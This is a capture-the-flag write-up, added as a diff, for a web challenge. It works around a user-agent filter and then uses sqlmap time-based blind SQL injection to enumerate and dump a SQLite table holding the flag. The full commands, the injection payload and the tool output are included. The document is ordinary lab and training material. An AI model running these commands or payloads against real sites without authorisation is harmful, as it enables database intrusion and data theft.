@@ -1,0 +1,122 @@
+
+
+# fomr the page source
+
+<!--Dev is only using Sqlite. Bobby Needs to fix this -->
+<!--Form to retrieve last name from first name. In Dev.-->
+
+sqlmap -u http://challenge.acictf.com:28986/?firstname=Hacker
+
+
+
+#nothing, need to impersonate someone else?
+
+curl http://challenge.acictf.com:28986/
+
+User-Agent Alert! Help! I'm Being Hacked!!! /dead
+
+# need to change the user agent string!!
+
+curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" http://challenge.acictf.com:28986/
+
+#worked!  lets try in sqlmap 
+
+sqlmap --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker
+
+# nothing, need to specify database?
+
+sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3
+
+
+sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 --tables
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:02:16 /2020-05-03/
+
+[15:02:17] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: firstname (GET)
+    Type: AND/OR time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: firstname=Hacker' OR 7813=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- eBHe
+---
+[15:02:17] [INFO] testing SQLite
+[15:02:17] [INFO] confirming SQLite
+[15:02:17] [INFO] actively fingerprinting SQLite
+[15:02:17] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:02:17] [INFO] fetching tables for database: 'SQLite_masterdb'
+[15:02:17] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[15:02:17] [INFO] resumed: 2
+[15:02:17] [INFO] resumed: SuperSecretData
+[15:02:17] [INFO] resumed: Users
+Database: SQLite_masterdb
+[2 tables]
++-----------------+
+| SuperSecretData |
+| Users           |
++-----------------+
+
+[15:02:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/challenge.acictf.com'
+
+[*] ending @ 15:02:17 /2020-05-03/
+
+
+
+sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 -T SuperSecretData --columns
+
+Parameter: firstname (GET)
+    Type: AND/OR time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: firstname=Hacker' OR 7813=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- eBHe
+---
+[08:40:45] [INFO] testing SQLite
+[08:40:45] [INFO] confirming SQLite
+[08:40:45] [INFO] actively fingerprinting SQLite
+[08:40:45] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:40:45] [INFO] resumed: CREATE TABLE `SuperSecretData` (\n\t`ID`\tINTEGER,\n\t`flag`\tTEXT\n)
+Database: SQLite_masterdb
+Table: SuperSecretData
+[2 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| flag   | TEXT    |
+| ID     | INTEGER |
++--------+---------+
+
+[08:40:45] [INFO] fetched data logged to text files under '/root/.sqlmap/output/challenge.acictf.com'
+
+[*] ending @ 08:40:45 /2020-04-30/
+
+
+sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 -T SuperSecretData -C flag --dump
+
+
+[08:50:59] [INFO] adjusting time delay to 1 second due to good response times
+1
+[08:51:31] [INFO] retrieved: ACI{59df47a3243d2f239ea
+
+[09:06:02] [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s)
+[09:06:12] [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s)
+8
+
+[09:06:34] [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s)
+78a7266}
+Database: SQLite_masterdb
+Table: SuperSecretData
+[1 entry]
++----+----------------------------------+
+| ID | flag                             |
++----+----------------------------------+
+| 1  | ACI{59df47a3243d2f239ea878a7266} |
++----+----------------------------------+
+
+[09:11:39] [INFO] table 'SQLite_masterdb.SuperSecretData' dumped to CSV file '/root/.sqlmap/output/challenge.acictf.com/dump/SQLite_masterdb/SuperSecretData.csv'
+[09:11:39] [INFO] fetched data logged to text files under '/root/.sqlmap/output/challenge.acictf.com'
+
+[*] ending @ 09:11:39 /2020-04-30/
+
